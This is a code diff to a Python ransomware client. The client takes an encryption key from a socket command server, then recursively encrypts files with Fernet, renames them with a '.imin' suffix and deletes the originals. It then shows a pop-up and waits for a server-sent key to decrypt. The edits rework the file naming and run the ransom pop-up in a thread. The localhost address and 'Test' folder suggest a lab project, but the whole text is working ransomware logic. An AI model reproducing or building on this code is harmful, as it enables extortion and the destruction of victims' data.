@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 import socket
 import select
 import sys
-from threading import Thread
+from threading import *
 import uuid
 
 import interface
@@ -28,9 +28,8 @@ def encrypt(file, key):
     
     encrypted = f.encrypt(original)
 
-    filename, extension = str(file).split('.')
-    filename += '_encrypted.'
-    encFile = Path(filename + extension)
+    filename = str(file) + '.imin'
+    encFile = Path(filename)
     with open(encFile, 'wb+') as fl:
         fl.write(encrypted)
     os.remove(file)
@@ -44,11 +43,9 @@ def decrypt(file, key):
     
     decrypted = f.decrypt(encrypted)
 
-    filename, extension = str(file).split('.')
-    filename = filename.split('_encrypted')[0]
+    filename = str(file).split('.imin')[0]
 
-    filename += '_decrypted.'
-    decFile = Path(filename + extension)
+    decFile = Path(filename)
 
     with open(decFile, 'wb+') as fl:
         fl.write(decrypted)
@@ -65,7 +62,6 @@ def encryptFiles(key):
         print('Encrypted ' + str(filePath))
 
 def decryptFiles(key):
-    exclude = ['.py','.pem', '.exe', '.imin']
     for item in recursiveScan(os.getcwd() + '\Test'): 
         filePath = Path(item)
         extension = filePath.suffix.lower()
@@ -80,14 +76,10 @@ HOST = 'localhost'
 PORT = 5789
 
 BUFFER_SIZE = 1024
-
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 print('Connected!')
 s.send(MESSAGE)
-
-
-
 
 while True:
 
@@ -99,14 +91,23 @@ while True:
         if sock == s:
             data = s.recv(4096)
             if not data:
-               print('\nDisconnected from server')
-               sys.exit()
+                print('\nDisconnected from server')
+                sys.exit()
             
             else:
-                if data.decode() == 'XD':
-                   decryptFiles(key1)
+                key = data.decode()
+                # this will be the string "wait" in the future, telling the system not to encrypt
+                if data.decode() != 'wait':
+                    encryptFiles(key)
+                
 
-                else:
-                    key1 = data.decode()   
-                    encryptFiles(key1)
-                    interface.App().pop_up_win()
+                t1 = Thread(target=interface.App().pop_up_win)
+                t1.daemon = True
+                t1.start()
+
+                # wait for a signal to begin decryption
+                print('Thread worked!!!')
+                
+                # recv waits for new input of key to decrypt
+                key = s.recv(4096)
+                decryptFiles(key)
